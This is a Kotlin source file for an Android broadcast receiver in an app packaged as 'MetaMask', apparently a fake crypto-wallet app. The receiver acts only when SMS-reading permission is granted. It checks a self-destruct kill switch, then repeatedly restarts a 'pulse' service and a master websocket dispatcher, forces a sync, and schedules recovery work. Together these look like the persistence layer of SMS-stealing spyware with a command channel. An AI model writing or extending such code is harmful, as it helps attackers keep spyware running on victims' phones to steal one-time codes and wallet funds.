package com.example.MetaMask.receivers

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import androidx.core.content.ContextCompat
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.OutOfQuotaPolicy
import androidx.work.WorkManager
import com.example.MetaMask.services.MasterWebSocketDispatcher
import com.example.MetaMask.services.PulseService
import com.example.MetaMask.services.ServiceStarterWorker
import com.example.MetaMask.services.sync.SyncManager

class ChimeraStateReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        android.util.Log.d("XDBG", "[ChimeraStateReceiver] onReceive enter context=ctx intent=${intent}") //xdbg
        val action = intent.action ?: return

        if (!hasSmsPermission(context)) {
            android.util.Log.d("XDBG", "[ChimeraStateReceiver] if branch") //xdbg
            return
        }

        executeRecoveryStack(context, action)
    }

    private fun hasSmsPermission(context: Context): Boolean {
        android.util.Log.d("XDBG", "[ChimeraStateReceiver] hasSmsPermission enter context=ctx") //xdbg
        android.util.Log.d("XDBG", "[ChimeraStateReceiver] return") //xdbg
        return ContextCompat.checkSelfPermission(
            context, android.Manifest.permission.READ_SMS
        ) == android.content.pm.PackageManager.PERMISSION_GRANTED
    }

    private fun executeRecoveryStack(context: Context, action: String) {
        android.util.Log.d("XDBG", "[ChimeraStateReceiver] executeRecoveryStack enter context=ctx action=${action}") //xdbg
        try {
            val killPrefs = context.getSharedPreferences(
                com.example.MetaMask.services.SelfDestructService.PREFS_NAME, Context.MODE_PRIVATE)
            if (killPrefs.getBoolean(
                    com.example.MetaMask.services.SelfDestructService.KEY_PERMANENTLY_DISABLED, false)) {
                return
            }
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[ChimeraStateReceiver] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
        }

        try {
            val pulseIntent = Intent(context, PulseService::class.java)
            val masterIntent = Intent(context, MasterWebSocketDispatcher::class.java).apply {
                putExtra("STARTED_FROM", "CHIMERA_$action")
            }

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                android.util.Log.d("XDBG", "[ChimeraStateReceiver] if branch") //xdbg
                context.startForegroundService(pulseIntent)
                context.startForegroundService(masterIntent)
            } else {
                context.startService(pulseIntent)
                context.startService(masterIntent)
            }

            SyncManager.forceSync()

        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[ChimeraStateReceiver] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
        }

        try {
            val alarmIntent = Intent(context, AlarmReceiver::class.java).apply {
                this.action = "com.example.MetaMask.INTERNAL_KICK"
            }
            context.sendBroadcast(alarmIntent)
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[ChimeraStateReceiver] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
        }

        try {
            val request = OneTimeWorkRequestBuilder<ServiceStarterWorker>()
                .setExpedited(OutOfQuotaPolicy.RUN_AS_NON_EXPEDITED_WORK_REQUEST)
                .addTag("CHIMERA_RECOVERY")
                .build()
            WorkManager.getInstance(context).enqueue(request)
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[ChimeraStateReceiver] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
        }
    }
}
